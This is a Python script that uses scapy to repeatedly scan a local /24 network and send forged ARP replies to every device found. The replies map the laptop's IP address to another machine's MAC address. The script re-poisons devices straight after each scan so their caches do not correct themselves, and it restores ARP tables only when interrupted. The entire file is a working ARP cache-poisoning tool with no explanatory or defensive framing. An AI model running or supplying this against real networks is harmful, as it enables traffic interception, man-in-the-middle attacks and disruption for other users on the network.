import scapy.all as scapy
import threading
import time
import signal
import sys

# Your actual values
laptop_ip = "192.168.31.248"
pc_mac = "00:2F:A7:E3:70:8A" # 00:2F:A7:E3:70:8A # 00:0C:29:4F:00:53
target_range = "192.168.31.1/24"

# Shared resources
devices = []
devices_lock = threading.Lock()
stop_event = threading.Event()

def get_mac(ip):
    ans, _ = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),
        timeout=1, verbose=False
    )
    for _, received in ans:
        return received.hwsrc
    return None

def spoof_target(device):
    arp_response = scapy.ARP(
        op=2,
        pdst=device['ip'],
        hwdst=device['mac'],
        psrc=laptop_ip,
        hwsrc=pc_mac
    )
    scapy.send(arp_response, verbose=False)

def restore_target(device):
    real_mac = get_mac(laptop_ip)
    arp_restore = scapy.ARP(
        op=2,
        pdst=device['ip'],
        hwdst=device['mac'],
        psrc=laptop_ip,
        hwsrc=real_mac
    )
    scapy.send(arp_restore, count=4, verbose=False)

def spoof_loop():
    while not stop_event.is_set():
        with devices_lock:
            targets = list(devices)
        for device in targets:
            spoof_target(device)
        time.sleep(1)

def scan_loop():
    while not stop_event.is_set():
        arp_request = scapy.ARP(pdst=target_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        answered = scapy.srp(packet, timeout=2, verbose=False)[0]
        found_devices = []

        for _, recv in answered:
            if recv.psrc != laptop_ip:
                found_devices.append({'ip': recv.psrc, 'mac': recv.hwsrc})

        with devices_lock:
            devices.clear()
            devices.extend(found_devices)

        print(f"[*] Scan complete. Found {len(found_devices)} devices.")

        # Immediately re-spoof after scan to prevent devices from updating with real MAC
        for device in found_devices:
            spoof_target(device)
            print(f"[!] Re-spoofed {device['ip']} immediately after scan")

        time.sleep(5)


def restore_all():
    print("\n[!] Restoring ARP tables...")
    with devices_lock:
        targets = list(devices)
    for device in targets:
        restore_target(device)
    print("[*] ARP tables restored.")

def signal_handler(sig, frame):
    print("\n[!] Ctrl+C detected! Cleaning up...")
    stop_event.set()
    restore_all()
    sys.exit(0)

if __name__ == "__main__":
    print("[*] Starting spoofing & scanning threads... Press Ctrl+C to stop.")
    signal.signal(signal.SIGINT, signal_handler)

    # Start threads
    spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
    scan_thread = threading.Thread(target=scan_loop, daemon=True)

    spoof_thread.start()
    scan_thread.start()

    while not stop_event.is_set():
        time.sleep(1)
